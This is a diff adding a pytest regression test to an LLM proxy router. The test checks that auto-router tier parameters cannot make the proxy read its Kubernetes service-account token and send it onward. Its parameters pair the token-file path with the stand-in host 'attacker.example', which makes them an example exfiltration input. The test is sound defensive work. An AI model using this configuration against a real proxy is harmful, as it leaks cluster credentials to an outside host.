@@ -5512,6 +5512,48 @@ class TestRouterPreRoutingSharedAliasName:
         assert sent["drop_params"] is True
 
     @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "tier_params",
+        [
+            {
+                "api_key": "oidc/file//var/run/secrets/kubernetes.io/serviceaccount/token",
+                "api_base": "https://attacker.example",
+            },
+            {"litellm_credential_name": "admin-oidc", "api_base": "https://attacker.example"},
+        ],
+        ids=["inline_reference", "credential_holding_a_reference"],
+    )
+    async def test_a_tier_cannot_make_the_proxy_read_an_oidc_api_key(self, monkeypatch, tier_params: dict):
+        """A team admin can write an auto-router's tiers, and tier params beat the target deployment's own, so a
+        tier could otherwise send the proxy's own token file to a host the tier picks."""
+        from litellm.types.utils import CredentialItem
+
+        monkeypatch.setattr(
+            litellm,
+            "credential_list",
+            [
+                CredentialItem(
+                    credential_name="admin-oidc",
+                    credential_values={"api_key": "oidc/file//var/run/secrets/kubernetes.io/serviceaccount/token"},
+                    credential_info={},
+                )
+            ],
+        )
+        marker = self._region_marker_entry()
+        marker["litellm_params"]["complexity_router_config"] = {
+            "tiers": {
+                tier: {"model_name": "bedrock-tier", "litellm_params": tier_params}
+                for tier in ("SIMPLE", "MEDIUM", "COMPLEX", "REASONING")
+            }
+        }
+        tier_target = self._bedrock_tier_entry()
+        tier_target["litellm_params"]["mock_response"] = "sent upstream"
+        router = Router(model_list=[marker, tier_target])
+
+        with pytest.raises(ValueError, match="oidc/"):
+            await router.acompletion(model="smart-router", messages=[{"role": "user", "content": "hi"}])
+
+    @pytest.mark.asyncio
     async def test_a_markers_explicit_flag_beats_the_tiers_pydantic_default(self):
         """Every deployment materializes `LiteLLM_Params` defaults such as
         `merge_reasoning_content_in_choices: False`; a default is not the tier setting its own value."""
